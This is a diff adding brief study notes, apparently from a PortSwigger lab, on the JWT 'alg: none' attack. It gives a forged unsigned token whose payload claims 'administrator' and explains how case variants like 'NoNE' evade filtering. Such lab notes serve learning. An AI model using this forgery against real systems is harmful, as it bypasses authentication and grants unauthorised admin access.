@@ -1,0 +1,21 @@
+allowing the user access to the alg key opens the door to trusting the user, which is never good.
+
+something like this allows the user to set the alg key to the value "none" or "NoNE" to try to encode it to bypass filtering
+{
+    "alg": "HS256",
+    "typ": "JWT"
+}
+
+
+doing this means there would be no signiture... therefore in the payload the attacker has to remvoe the signiture
+leaving only the header and the payload of the JWT
+
+looking something like this:
+eyJraWQiOiI4MTEyZTE0Ny1hNzBlLTRhY2YtYThkYi0xNzRkZGUyYTNhMjEiLCJhbGciOiJub25lIn0%3d.
+eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTcxMTQ1ODk2MCwic3ViIjoiYWRtaW5pc3RyYXRvciJ9.
+
+which translates to this:
+{"kid":"8112e147-a70e-4acf-a8db-174dde2a3a21","alg":"none"}
+{"iss":"portswigger","exp":1711458960,"sub":"administrator"}
+
+this gives us access to the admin page when requesting the page as we are technically the administrator according to the JWT
